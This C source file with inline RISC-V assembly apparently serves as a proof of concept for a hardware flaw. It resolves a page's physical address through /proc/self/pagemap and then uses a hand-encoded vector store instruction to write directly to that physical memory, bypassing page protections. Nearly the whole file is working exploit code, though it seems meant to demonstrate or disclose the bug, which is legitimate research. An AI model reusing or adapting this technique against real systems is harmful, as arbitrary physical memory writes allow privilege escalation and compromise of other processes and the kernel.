// NOTE: compile with any vector extension, e.g., -march="rv64gzve64x"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

size_t get_physical_address(size_t vaddr) {
    if (geteuid() != 0) {
        printf("Getting the physical address requires using sudo/root.\n");
        exit(EXIT_FAILURE);
    }
    int fd = open("/proc/self/pagemap", O_RDONLY);
    uint64_t virtual_addr = (uint64_t)vaddr;
    size_t value = 0;
    off_t offset = (virtual_addr / 4096) * sizeof(value);
    int got = pread(fd, &value, sizeof(value), offset);
    if(got != sizeof(value)) {
        return 0;
    }
    close(fd);
    return (value << 12) | ((size_t)vaddr & 0xFFFULL);
}

static inline void maccess(void *addr) {
  asm volatile("ld a7, (%0)" : : "r"(addr) : "a7", "memory");
}

char __attribute__((aligned(4096))) buffer[2<<20];

static void evict() {
    for (unsigned i = 0; i < sizeof(buffer); i+=4096) {
        maccess(&buffer[i]);
    }
    asm volatile("fence\n\t");
}

int main() {
    memset(buffer, 0xff, sizeof(buffer));

    volatile uint64_t* target = mmap(NULL, sizeof(*target), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    *target = 0xcaaa;

    uint64_t virt = (uint64_t)target;
    uint64_t phys = get_physical_address(virt);

    printf("Virtual address:  %16lx\n", virt);
    printf("Phyiscal address: %16lx\n\n", phys);

    printf("Value before:     %16lx\n", *target);

    evict();
    asm volatile(
            "mv t0, %0\n\t"
            "mv a0, %1\n\t"
            "vsetvli zero, zero, e8, m1\n\t"
            "vmv.v.x v0, a0\n\t"
            /* vse128.v v0, 0(t0) */
            ".fill 1, 4, 0x10028027\n\t"
            "fence" :: "r"(phys), "r"(0xfe) : "ra");

    printf("Value after:      %16lx\n", *target);
}
